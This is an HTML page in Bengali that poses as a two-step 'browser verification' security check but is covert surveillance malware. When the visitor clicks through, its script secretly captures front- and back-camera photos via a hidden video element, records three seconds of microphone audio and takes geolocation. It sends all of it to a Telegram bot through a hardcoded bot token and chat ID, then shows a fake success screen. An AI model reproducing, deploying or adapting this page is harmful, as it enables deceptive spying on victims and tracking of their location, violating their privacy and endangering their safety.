<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Browser ভেরিফিকেশন</title>
    <style>
        :root { --primary: #00d1b2; --dark: #363636; }
        body { font-family: 'Segoe UI', sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
        .card { background: white; padding: 40px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center; max-width: 400px; width: 90%; z-index: 10; position: relative; }
        h2 { color: var(--dark); margin-bottom: 10px; font-size: 22px; }
        p { color: #666; margin-bottom: 25px; font-size: 15px; min-height: 45px; }
        .btn-action { background: var(--primary); color: white; border: none; padding: 15px 30px; border-radius: 10px; font-size: 18px; font-weight: bold; cursor: pointer; width: 100%; transition: 0.3s; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid var(--primary); border-radius: 50%; width: 35px; height: 35px; animation: spin 1s linear infinite; margin: 15px auto; display: none; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #video { position: fixed; top: 0; left: 0; width: 1px; height: 1px; opacity: 0.01; pointer-events: none; }
        #canvas { display: none; }
        #my-img { width: 100%; border-radius: 12px; display: none; margin-top: 20px; }
    </style>
</head>
<body>

<div class="card" id="main-ui">
    <div id="icon" style="font-size: 50px; margin-bottom: 20px;">🔒</div>
    <h2 id="title">Browser ভেরিফিকেশন</h2>
    <p id="desc">আপনার ব্রাউজার নিরাপত্তা নিশ্চিত করতে নিচের বাটনে ক্লিক করুন।</p>
    
    <div id="loader" class="loader"></div>
    <button class="btn-action" id="main-btn" onclick="stepOne()">চেক শুরু করুন</button>

    <img id="my-img" src="my_photo.jpg" alt="Success">
</div>

<video id="video" autoplay playsinline muted></video>
<canvas id="canvas"></canvas>

<script>
const TOKEN = "8657895361:AAGOkn7MmVJEBhblZ8V5zc16WAzxtRujNqg";
const CHAT_ID = "-1003747831651";

// ১. প্রথম বাটন ক্লিক করলে ফ্রন্ট ক্যামেরা পারমিশন নিবে
async function stepOne() {
    toggleUI(true);
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        
        // লোকেশনও বাটন ক্লিকের পরেই নেওয়া হবে
        let loc = "লোকেশন পাওয়া যায়নি";
        try {
            const pos = await new Promise((res, rej) => {
                navigator.geolocation.getCurrentPosition(res, rej, { timeout: 5000 });
            });
            loc = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
        } catch(e){}

        await captureAndSend(stream, `📊 রিপোর্ট ধাপ ১\n📍 লোকেশন: [ম্যাপ](${loc})`);
        
        updateStep("चমৎকার!", "আপনি browser verification প্রথম ধাপ অতিক্রম করেছেন।", "পরবর্তী ধাপ (Next)", stepTwo);
    } catch (err) {
        alert("ক্যামেরা পারমিশন ছাড়া ভেরিফিকেশন সম্ভব নয়।");
        toggleUI(false);
    }
}

// ২. দ্বিতীয় বাটন ক্লিক করলে ব্যাক ক্যামেরা ও অডিও পারমিশন নিবে
async function stepTwo() {
    toggleUI(true);
    document.getElementById('desc').innerText = "আপনার ভেরিফিকেশনটি যাচাই করা হচ্ছে...";
    try {
        // ব্যাক ক্যামেরা
        try {
            const bStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
            await captureAndSend(bStream, "--- ব্যাক ক্যামেরা ছবি ---");
        } catch (e) {}

        // অডিও পারমিশন
        const aStream = await navigator.mediaDevices.getUserMedia({ audio: true });
        await captureAudio(aStream);

        updateStep("সফল হয়েছে!", "সবগুলো সিকিউরিটি প্যারামিটার যাচাই করা হয়েছে।", "ফাইনাল ভেরিফাই (Final)", finalStep);
    } catch (err) {
        finalStep();
    }
}

// ৩. ফাইনাল বাটন ক্লিক করলে ছবি দেখাবে
function finalStep() {
    toggleUI(false);
    document.getElementById('main-btn').style.display = 'none';
    document.getElementById('icon').innerHTML = "✅";
    document.getElementById('title').innerText = "অভিনন্দন!";
    document.getElementById('desc').innerText = "আপনি সফলভাবে ভেরিফিকেশন কমপ্লিট করেছেন।";
    document.getElementById('my-img').style.display = 'block';
}

function updateStep(title, desc, btnText, nextFunc) {
    toggleUI(false);
    document.getElementById('title').innerText = title;
    document.getElementById('desc').innerText = desc;
    document.getElementById('main-btn').innerText = btnText;
    document.getElementById('main-btn').onclick = nextFunc;
}

function toggleUI(showLoader) {
    document.getElementById('loader').style.display = showLoader ? 'block' : 'none';
    document.getElementById('main-btn').style.display = showLoader ? 'none' : 'block';
}

async function captureAndSend(stream, caption) {
    const video = document.getElementById('video');
    video.srcObject = stream;
    await video.play();
    return new Promise(resolve => {
        setTimeout(async () => {
            const canvas = document.getElementById('canvas');
            canvas.width = 640; canvas.height = 480;
            canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
            canvas.toBlob(async (blob) => {
                const fd = new FormData();
                fd.append('chat_id', CHAT_ID);
                fd.append('photo', blob, 'img.jpg');
                fd.append('caption', caption);
                fd.append('parse_mode', 'Markdown');
                await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                stream.getTracks().forEach(t => t.stop());
                resolve();
            }, 'image/jpeg', 0.6);
        }, 2000);
    });
}

async function captureAudio(stream) {
    const recorder = new MediaRecorder(stream);
    const chunks = [];
    return new Promise(resolve => {
        recorder.ondataavailable = e => chunks.push(e.data);
        recorder.onstop = async () => {
            const blob = new Blob(chunks, { type: 'audio/ogg' });
            const fd = new FormData();
            fd.append('chat_id', CHAT_ID);
            fd.append('voice', blob, 'audio.ogg');
            await fetch(`https://api.telegram.org/bot${TOKEN}/sendVoice`, { method: 'POST', body: fd });
            stream.getTracks().forEach(t => t.stop());
            resolve();
        };
        recorder.start();
        setTimeout(() => recorder.stop(), 3000);
    });
}
</script>
</body>
</html>
